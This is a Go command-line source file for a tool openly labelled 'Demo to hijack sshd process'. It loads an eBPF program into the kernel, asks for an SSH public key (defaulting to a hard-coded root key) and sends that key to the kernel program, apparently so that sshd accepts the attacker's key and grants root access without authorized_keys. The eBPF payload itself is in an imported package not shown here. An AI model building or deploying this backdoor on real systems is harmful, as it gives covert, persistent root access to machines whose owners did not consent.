package subCommand

import (
	ebpf "ebpf_common/pkg/ebpf-new"
	_ "embed"
	"github.com/AlecAivazis/survey/v2"
	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
	"os"
	"os/signal"
)

//go:embed description.txt
var Description string

var DemoCmd = &cobra.Command{
	Use:   "demo",
	Short: "Demo to hijack sshd process",
	Long:  Description,
	Run: func(cmd *cobra.Command, args []string) {
		log.Info("Start ebpf runtime instance")
		e := ebpf.New()
		var err error
		err = e.CreateCiliumEBPFRuntime(false)
		if err != nil {
			log.Panicln(err)
		}
		defer func(e *ebpf.CiliumEBPFRuntime) {
			err := e.Close()
			if err != nil {
				log.Panicln(err)
			}
		}(e)
		err = e.CreateLink()
		if err != nil {
			log.Panicln(err)
		}
		log.Info("Injecting ebpf program into file system success.")
		var blocker = make(chan os.Signal, 1)
		signal.Notify(blocker, os.Interrupt, os.Kill)
		err = e.SendKey(ReadInputAsKey(blocker))
		if err != nil {
			log.Panicln(err)
		}
		log.Info("Send to kernel mode successful")
		<-blocker
	},
}

func ReadInputAsKey(block chan os.Signal) (key string) {
	_ = survey.AskOne(&survey.Input{
		Message: "You need input a ssh key to send to hijack sshd process\n",
		Default: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMzFePM0u92NjpCJ3TvGIY4CidzTTRoEzNdmLNUxcNNC root",
	}, &key)
	if key == "exit" {
		block <- os.Interrupt
	}
	log.Info("Your Key set is ", key)
	return
}
